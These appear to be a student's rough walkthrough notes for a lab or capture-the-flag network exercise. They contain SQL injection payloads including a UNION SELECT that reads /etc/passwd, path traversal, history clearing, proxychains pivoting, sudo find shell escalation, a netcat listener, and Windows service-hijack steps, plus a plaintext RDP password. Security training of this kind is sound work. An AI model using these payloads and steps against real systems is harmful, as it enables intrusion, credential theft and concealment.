# Begin intial nmap scans
nmap -Pn ##############
#################
Look at web pages
Look at Source code
open up all pages
naviagte to file locations found in the scripts
Home button/PDFs

FIle to read, you see that
myfile=../../../../../../../
- cat the file you can read an explore what you can cat to et information
- going to the unserame and login 
- username:Ford' or 1='1 password:Ford' or 1='1
- "inspect the source" then change the method from POST to GET
- once get crednetials, open bash shell unset HISTFILE
  - check hosts file cat /etc/hosts
  - ping -c1 BestWebApp
  - ## NEW TARGET Found
- Now go right to 192.168.28.181 website, boom
- now proxychains nmap -Pn 192.168.28.181 - see ports 22/80
- rerun your proxychains nmap scripts on this machines
- BOOM WEBPAGE, INSPECT SOURCE code
- submit and look at tall of the php in the searhc banner
- product=7 or 1=1ScaryTerry
- LOOK INTO EACH SELECTION FIELD
  - siteuser
# AARON has not been found that
username, name,user_id from siteusers.users
http://192.168.28.181/pick.php?product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns;
http://192.168.28.181/pick.php?product=7 UNION SELECT 1,2,3 FROM information_schema.columns;

@@version,database(),load_file("/etc/passwd")
## Credentials from 2ne box acquired, now move on
go back to box, use your for loop to find more addresses
create a tunnel now
echo $0
echo $shell
/hom /tmp /etc /cron*uname -A
now ellevater 
1. sudo -l 
   1. gtfo bins - type in fin (
   2. sudo find . -exec /bin/sh \; -quitshell sui sudo)

ls | grep cron
cat crontab
look at non-standard crontabs
change direction to directory of the scripts being ran in the Older
- dig through the libraries
- netstat -natup, see if its listening
- ps -elf and look through the process list, 
  - cron service is running the service
  - get the hostname so you known
After you rerun the python script on the same network to see the new addresses
## NEW ips
now run your nmap scans
nmap -sV -Pn 192.168.28.179 --script banner -p 22,3389
server 9999 is your vuln server
- grab your callback to the call server and point it to the ip address of the vuln server
- nc listneer on oips nc -lvnp 4444
- then from ops proxychains
- # last box
- close tunnels so you can RDP 
- xfreerdp /v:localhost:2222 /u:Lroth /p:anotherpassword4THEages /size:1920x1080 +clipboard
- ## Go to windows box
- change directory to hidden and show exntensions on windows
  - user home, system32
  - persistance keys
  - check all the keys
- ## time to elevate on windows
- look at services and scheduled tasks
- task scheduler
- Sort your servuces
  - sort by descpoolription
  - clip and open up the properrties
  - go to the directory, look good, now looking at permisions.
    - creat file, try and rename program, unable to execute from inside
    - move to each program or executbale until you find one that you can exploit
    - go to the service and in services see what the servuice is running as,
      - or putty its running ansd able to be exploited
      - drill down into the directory, yes you can put thigns int there
      - take the file and compile it, throw it into folde to create a user account with admin priviledges